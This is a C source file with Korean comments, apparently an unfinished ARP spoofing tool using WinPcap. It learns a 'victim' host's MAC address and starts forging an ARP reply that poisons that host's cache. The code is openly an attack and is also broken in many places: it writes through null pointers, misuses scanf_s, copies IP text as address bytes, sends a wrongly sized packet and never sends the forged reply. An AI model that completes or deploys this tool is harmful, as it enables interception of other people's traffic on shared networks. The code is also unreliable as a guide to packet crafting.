#include <winsock2.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>


#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment (lib, "wpcap.lib")
#pragma comment (lib, "ws2_32.lib")

#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))

/* Note: could also use malloc() and free() */
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);


//packet_handler 함수에서도 쓰기 위해 전역변수로 선언
PIP_ADAPTER_INFO pAdapterInfo;
PIP_ADAPTER_INFO pAdapter = NULL;
u_char victim_mac[6];

typedef struct ether_header
{
	unsigned char ether_dhost[6];//ethernet destination MAC
	unsigned char ether_shost[6];//ethernet source MAC
	unsigned short ether_type;	   //ethernet Type
}ether_header;

typedef struct arp_header {
	unsigned short hard_type;	// 0x0001 (Ethernet)
	unsigned short prot_type;	// 0x0800 (IP)
	unsigned char hard_size;	// 6
	unsigned char prot_size;	// 4
	unsigned short op;			// 0x0001 (ARP request) 0x0002 (ARP reply)
	unsigned char sender_eth_addr[6];//sender MAC Address
	unsigned char sender_ip_addr[4]; //sender IP Address
	unsigned char target_eth_addr[6];//victim MAC Address
	unsigned char target_ip_addr[4]; //victim IP Address
}arp_header;

int __cdecl main()
{
	//pcap사용을 위한 변수 선언
	pcap_if_t *alldevs;
	pcap_if_t *d;
	int inum;
	int i = 0;
	pcap_t *adhandle;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_int netmask;
	char packet_filter[] = "";
	struct bpf_program fcode;

	ether_header *requeh = { 0 };
	arp_header *requah = { 0 };
	ether_header *repeh = { 0 };
	arp_header *repah = { 0 };

	int sendlength = 0;

	//---------------------------------------------------------------------------------------
	//나의 MAC, IP 게이트웨이의 IP 주소 얻어오기


	DWORD dwRetVal = 0;
	UINT i2;
	char sendpacket[1500];
	char targetip[6];
	/* variables used to print DHCP time info */
	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO *)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		printf("Error allocating memory needed to call GetAdaptersinfo\n");
		return 1;
	}
	// Make an initial call to GetAdaptersInfo to get
	// the necessary size into the ulOutBufLen variable
	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			printf("Error allocating memory needed to call GetAdaptersinfo\n");
			return 1;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		printf("\tAdapter Addr: \t");
		for (i2 = 0; i2 < pAdapter->AddressLength; i2++) {
			if (i2 == (pAdapter->AddressLength - 1))
				printf("%.2X\n", (int)pAdapter->Address[i2]);
			else
				printf("%.2X-", (int)pAdapter->Address[i2]);
		}


		printf("\tIP Address: \t%s\n",
			pAdapter->IpAddressList.IpAddress.String);

		printf("\tGateway: \t%s\n", pAdapter->GatewayList.IpAddress.String);

	}

	//------------------------------------------------------------------------------------
	//pcap 사용준비하기
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	for (d = alldevs; d; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}

	printf("Enter the interface number (1-%d):", i);
	scanf_s("%d", &inum);

	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);

	if ((adhandle = pcap_open(d->name,
		65536,
		PCAP_OPENFLAG_PROMISCUOUS,
		1000,
		NULL,
		errbuf
	)) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	if (pcap_datalink(adhandle) != DLT_EN10MB)
	{
		fprintf(stderr, "\nThis program works only on Ethernet networks.\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	if (d->addresses != NULL)
		netmask = ((struct sockaddr_in *)(d->addresses->netmask))->sin_addr.S_un.S_addr;
	else
		netmask = 0xffffff;


	if (pcap_compile(adhandle, &fcode, packet_filter, 1, netmask) < 0)
	{
		fprintf(stderr, "\nUnable to compile the packet filter. Check the syntax.\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	if (pcap_setfilter(adhandle, &fcode) < 0)
	{
		fprintf(stderr, "\nError setting the filter.\n");
		pcap_freealldevs(alldevs);
		return -1;
	}


	//ARP 패킷 보내기 전에 비우기
	memset(sendpacket, 0x00, 1500);

	//ethernet header 세팅
	for (i2 = 0; i2 < 4; i2++)
	{
		memset(requeh->ether_dhost, 0xFF, 6);
		//requeh->ether_dhost[i2] = 0xFF;
		//requeh->ether_dhost[i2] = (int)pAdapter->Address[i2];

		printf("\n ethernet destination : %s\n", requeh->ether_dhost);
	}
	requeh->ether_type = 0x0806;

	//ARP header 세팅
	requah->hard_type = 0x0001;
	requah->prot_type = 0x0800;
	requah->hard_size = 0x06;
	requah->prot_size = 0x04;
	requah->op = 0x0001;

	scanf_s("Victim IP Address(no .) : %s\n", targetip,sizeof(targetip));
	for (i2 = 0; i2 < 4; i2++)
	{
		requah->sender_ip_addr[i2] = pAdapter->IpAddressList.IpAddress.String[i2];
		requah->target_ip_addr[i2] = targetip[i2];
	}
	for (i2 = 0; i2 < 6; i2++)
	{
		requah->sender_eth_addr[i2] = pAdapter->Address[i2];
		requah->target_eth_addr[i2] = 0xFF;
	}
	//완성된 패킷 전송
	memcpy(sendpacket, &requeh, sizeof(requeh));
	sendlength += sizeof(requeh);

	memcpy(sendpacket + sendlength, &requah, sizeof(requah));
	
	if (pcap_sendpacket(adhandle, sendpacket, sendlength) != 0)
	{
		fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(adhandle));
		return -1;
	}

	//ARP reply 받아오기
	pcap_freealldevs(alldevs);


	//상대방의 MAC값을 얻으러 출발
	pcap_loop(adhandle, 0, packet_handler, NULL);


	//ARP REPLY 전송!
	for (i2 = 0; i2 < 6; i2++)
	{
		repeh->ether_shost[i2] = pAdapter->Address[i2];
		repeh->ether_dhost[i2] = victim_mac[i2];
	}
	repeh->ether_type = 0x0806; //ARP datagrams
	repah->hard_type = 0x01;	//Ethernet
	repah->prot_type = 0x0800;	//IP datagrams
	repah->op = 0x0002;			//ARP REPLY
	repah->hard_size = 0x06;
	repah->prot_size = 0x04;
	for (i2 = 0; i2 < 4; i2++)
	{
		repah->sender_ip_addr[i2] = pAdapter->IpAddressList.IpAddress.String[i2];
		repah->target_ip_addr[i2] = targetip[i2];
	}
	system("pause");
}

void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)
{
	ether_header *repeh;
	arp_header *repah;
	u_int num = 0;
	

	//reply_ethernet packet을 받는다.
	repeh = (ether_header *)(pkt_data);
	
	repah = (arp_header *)(pkt_data + 14);

	if (repah->op == 0x0002)
	{
		if (repah->target_eth_addr == pAdapter->IpAddressList.IpAddress.String)
		{
			for (num = 0; num < 6; num++)
			{
				victim_mac[num] = repah->sender_eth_addr[num];
				//전역변수에 mac값이 하나씩 저장된다.
				return 1;
			}
		}
	}
}